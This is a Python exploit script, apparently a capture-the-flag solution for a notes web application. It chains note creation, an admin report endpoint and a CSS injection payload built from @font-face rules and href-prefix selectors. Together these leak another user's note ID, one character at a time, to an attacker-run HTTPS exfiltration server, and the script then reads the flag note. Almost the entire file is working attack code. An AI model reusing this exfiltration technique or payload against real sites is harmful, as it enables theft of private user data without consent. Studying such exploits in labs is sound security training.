#!/usr/bin/env python3

import http.server
import json
import os
import requests
import string
import ssl
import subprocess

# Config
APP_SERVER = "http://localhost:8000"
EXFIL_DOMAIN = "172.17.0.1"
EXFIL_SERVER_PORT = 9050
EXFIL_PATH = "/hatenotes/"

# Const
USER_EMAIL = "x"
USER_PWD = "x"
EXFIL_URL = f"https://{EXFIL_DOMAIN}:{EXFIL_SERVER_PORT}{EXFIL_PATH}"
HEX_CHARS = "0123456789abcdef"
FIRING_PIN_DELAY = 2


class Notes:

    def __init__(self, user_email=USER_EMAIL, user_password=USER_PWD):
        self.session = requests.Session()
        self.user = user_email
        self.password = user_password

    def register(self):
        register_url = f"{APP_SERVER}/api/auth/register"
        data = {"email": self.user, "password": self.password}
        response = self.session.post(register_url, data=data, allow_redirects=False)
        return True if response.status_code == 302 else False

    def login(self):
        login_url = f"{APP_SERVER}/api/auth/login"
        data = {"email": self.user, "password": self.password}
        response = self.session.post(login_url, data=data, allow_redirects=False)
        return True if response.status_code == 302 else False

    def add_note(self, title, content):
        notes_url = f"{APP_SERVER}/api/notes"
        data = {"title": title, "content": content}
        response = self.session.post(notes_url, data=data)
        return response.json()["id"] if response.status_code == 201 else None

    def get_note(self, note_id):
        note_url = f"{APP_SERVER}/api/notes/{note_id}"
        response = self.session.get(note_url, stream=True)
        return response.text if response.status_code == 200 else None

    def report(self, note_id):
        report_url = f"{APP_SERVER}/report"
        data = {"noteId": note_id}
        response = self.session.post(report_url, data=data)
        return True if response.status_code == 200 else False

    def css_injection(self, noteid_prefix, exfil_url=EXFIL_URL):
        msg = ""
        for c in HEX_CHARS:
            p = noteid_prefix + c
            msg += f"@font-face {{font-family: font{c}; src: url({exfil_url}{p});}} "
            msg += f'#notesList li:last-child a[href^="/api/notes/{p}"] '
            msg += f"{{font-family: font{c};}} "
        uuid1 = self.add_note(msg, " ")
        msg = f'<link rel=stylesheet href="/static/api/notes/{uuid1}">'
        uuid2 = self.add_note(msg, " ")
        return self.report(uuid2)


class ExfilServer(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path.startswith(EXFIL_PATH):
            prefix = self.path[len(EXFIL_PATH) :]
            print(f"UUID prefix: {prefix}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            n = Notes()
            n.login()
            if len(prefix) < 36:
                if len(prefix) in (8, 13, 18, 23):
                    prefix += "-"
                n.css_injection(prefix)
            else:
                flag = n.get_note(prefix).split(":")[0]
                print(f"Flag obtained: {flag}")

    def log_message(self, format, *args):
        pass


def prepare_cert():
    if not os.path.exists("server.pem"):
        print(f"Create SSL certificate: server.pem")
        subprocess.run(
            [
                "openssl",
                "req",
                "-new",
                "-x509",
                "-keyout",
                "server.pem",
                "-out",
                "server.pem",
                "-days",
                "365",
                "-nodes",
                "-subj",
                "/CN=localhost",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )


def init_user():
    print(f"Init user: {USER_EMAIL}")
    n = Notes()
    if not n.login():
        n.register()


def load_firing_pin():
    print("Load firing pin...")
    subprocess.Popen(
        f"sleep {FIRING_PIN_DELAY}; curl -k {EXFIL_URL}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def start_exfil_server():
    print("Start exfiltration server...")
    s = http.server.HTTPServer(("0.0.0.0", EXFIL_SERVER_PORT), ExfilServer)
    s.socket = ssl.wrap_socket(s.socket, certfile="server.pem", server_side=True)
    s.serve_forever()


if __name__ == "__main__":
    prepare_cert()
    init_user()
    load_firing_pin()
    start_exfil_server()
